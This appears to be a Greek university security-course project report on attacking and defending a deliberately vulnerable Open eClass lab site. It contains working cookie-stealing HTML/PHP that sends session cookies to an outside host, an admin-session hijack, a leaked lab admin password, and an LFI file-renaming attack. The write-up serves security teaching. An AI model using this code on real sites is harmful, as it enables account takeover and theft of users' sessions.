## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://crypto.di.uoa.gr/csec/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


## 2020 Project 1

Εκφώνηση: https://crypto.di.uoa.gr/csec/assets/projects/project1.pdf


### Μέλη ομάδας

- 1115201500038, Ευαγγελινού Ευστρατία 
- 1115201400297, Ματάνις Παναγιώτης

### Report

Συμπληρώστε εδώ __ένα report__ που
- Να εξηγεί τι είδους αλλαγές κάνατε στον κώδικα για να προστατέψετε το site σας (από την κάθε επίθεση).
- Να εξηγεί τι είδους επιθέσεις δοκιμάσατε στο αντίπαλο site και αν αυτές πέτυχαν.


### DEFENCES:

#### __XSS:__
Καταρχάς ελέγχηκε ο κώδικας του site σε οποιοδήποτε σημείο δινόταν είσοδος από τον χρήστη, κάποιον καθηγητή ή τον διαχειριστή (διάφορες φόρμες που υπήρχαν για στοιχεία, τίτλοι, ονόματα κλπ) για τυχόν αδυναμίες σε xss attacks. Προβλήματα εντοπίστηκαν στην πλειοψηφία των σημείων που εκτυπωνόταν η δοθείσα από το χρήστη τιμή και αντιμετωπίστηκαν με την χρήση της htmlspecialchars στο σημείο εξαγωγής τους από την βάση, για συλλογές στοιχείων αντικαταστάθηκε το η συλλογή στο σύνολο της. Το εν λόγω μέτρο προστασίας εφαρμόστηκε και σε διάφορα σημεία τα οποία εκ πρώτης όψης δεν παρουσίασαν κάποια αδυναμία σε επιθέσεις τέτοιου τύπου. Όσον αφορά την διαχείριση των αρχείων  επιλέξαμε να κάνουμε “υποχρεωτικό” το download απο τον χρήστη ώστε να μην μπορεί να εκτελεστεί το περιεχόμενο τους, όπως πχ γινόταν με αρχεία html. 

#### __SQL INJECTION:__
Όσον αφορά την συγκεκριμένη επίθεση μετά από διάφορες δοκιμές σε σημεία του site δεν βρέθηκε κάποια ευπάθεια, οπότε δεν έγινε και κάποια αλλαγή ως προς αυτό το κομμμάτι.

#### __CSRF:__
Η προστασία που επιλέχθηκε για την συγκεκριμένη επίθεση είναι αυτή της χρήσης ενός anti-CSRF  token. Το token δημιουργείται τυχαία κατά την έναρξη του κάθε session, είναι ξεχωριστό για το καθένα και αποθηκεύεται σε αυτό. Υπάρχει σε όλα τα σημεία που ο διαχειριστής μπορεί να εκτελέσει κάποια λειτουργία με την μορφή hidden input στην φόρμα και σε περίπτωση αποτυχίας συμπλήρωσης του κάνει exit() χωρίς να πραγματοποιηθεί καμία αλλαγή.
 

### ATTACKS:
Η αντίπαλη ομάδα ήταν οι 1337-h4x0rz. Οι επιθέσεις που δοκιμάστηκαν είναι οι παρακάτω

#### XSS:
Αρχικά δοκιμάστηκαν όλες οι φόρμες που είχαμε βρει από το δικό μας site ότι ήταν ευάλωτες σε τυχόν τέτοιες αδυναμίες, προσπαθώντας να εκτελέσουμε δικό μας κώδικα στην σελίδα. Καταφέραμε να εισάγουμε script σε διάφορα σημεία παρόλαυτα επιλέξαμε την ανταλλαγή αρχείων ως “κεντρικό” σημείο επίθεσης καθώς μας δινόταν η δυνατότητα να ανεβάσουμε αρχεία. 

#### CSRF:
Η συγκεκιμένη επίθεση συνδυάστηκε με την παραπάνω αδυναμία της ανταλλαγής αρχείων. Αρχικά το puppies διαμορφώθηκε με κατάλληλο τρόπο ώστε κάτα την είσοδο σε αυτό να ανακατευθύνει το χρήστη στην σελίδα της ανταλλαγής αρχείων πατώντας το συγκεκριμένο κακόβουλο αρχείο που είχε ανέβει. Το αρχείο με την σειρά του ανακατεύθυνε τον χρήστη πίσω στο puppies στέλνοντας ταυτόχρονα και το cookie του χρήστη. Το cookie αποθηκευόταν στο σέρβερ μας και το url της σελίδας άλλαζε ώστε να μην είναι δυνατόν για το χρήστη να καταλάβει ότι πέρασε από το eclass. Έπειτα χρησιμοποιώντας το cookie του admin συνδεθήκαμε ως διαχειριστές στην πλατφόρμα από όπου και πήραμε τον κώδικό της αντίπαλης ομάδας από το αρχείο ρυθμίσεων (**admin password: znEwSz57Qk**). 

* Puppies index.php:
```php
<html><body>
<h1><?= "Puppies!" ?></h1>
<img src="https://i.ytimg.com/vi/DhpYAyVsFXQ/hqdefault.jpg"></img>

<?php
    $cookie = $_POST["c"];
    
    /* Αν υπάρχει το cookie γράφετε στο log.txt*/
    if(isset($cookie)) {
        $file = fopen('log.txt', 'a');
        fwrite($file, $cookie. "\n\n");
    }
    else { /* Αν δεν υπάρχει cookie γίενται redirect στο redirect.html που είναι ανεβασμένο στην ανταλλαγη αρχείων του αντιπάλου */
        header ('Location:http://1337-h4x0rz.csec.chatzi.org/modules/dropbox/dropbox_download.php?id=14');
    }
?>
</body></html>
```

* Το αρχείο που ανεβάσαμε στην ανταλλαγή αρχείων. Κάνει redirect στο puppies στέλνοντας μαζί και το cookie: 
```html
<!-- redirect.html -->
<body onload='get_cookie()'>
<form method="post" action="http://xxx--cookielover--xxx.puppies.chatzi.org">
	<input type="hidden" name="c" id="c" value=''><br>
</form>

<script type="text/javascript">
      function get_cookie(){
      	 document.getElementById("c").value = document.cookie;
      	 document.forms[0].submit();
      }
</script>

</body>
```

Πέρα από αυτή την επίθεση δοκιμάσαμε στο τοπικό μας μηχάνημα καθώς και στην online έκδοση του eclass μια σειρά από επιθέσεις για δημιουργία/επεξεργασία μαθημάτων, τμημάτων, αποδοχή αιτήσεων καθηγητών κ.ά. Παρόλαυτα εφόσον πέτυχε η πρώτη επίθεση και βρέθηκε ο κωδικός του διαχειριστή δεν δοκιμαστηκαν περαιτέρω επιθέσεις μέσω του drunkadmin. Επισυνάπτονται οι επιθέσεις που δημιουργήθηκαν. 

#### LFI:
Η συγκεκριμένη επίθεση χρησιμοποιήθηκε για να παρακαμφθεί ο περιορισμός που υπήρχε απο το site και εκτελούσε download ενός αρχείου, που είχε ανέβει μέσω της εργασίας, όταν ο χρήστης κλίκαρε σε αυτό. Βρίσκοντας τον χώρο που ήταν αποθηκευμένα τα αρχεία καταφέραμε να εκτελέσουμε ενα php αρχείο το οποίο μετόνομασε το index.php σε index2.php και στην συνέχεια με αντίστοιχο τρόπο μετονομάσαμε ένα δικό μας αρχείο σε index.php, το οποίο είχε προστεθεί στο φάκελο των εργασιών από δεύτερο χρήστη. 
* Το σημείο που χρησιμοποιήσαμε για να εκτελέσουμε το php αρχείο που αλλάζει το index.php του eclass:
![LFI Attack](https://scontent.fath3-3.fna.fbcdn.net/v/t1.15752-9/95477098_245203889895725_8195861322433298432_n.png?_nc_cat=104&_nc_sid=b96e70&_nc_ohc=Oi_lGJH3SxsAX8yYTEx&_nc_ht=scontent.fath3-3.fna&oh=7a3295878d32b2d5d9e5d8e77889ce28&oe=5ED15B6D)





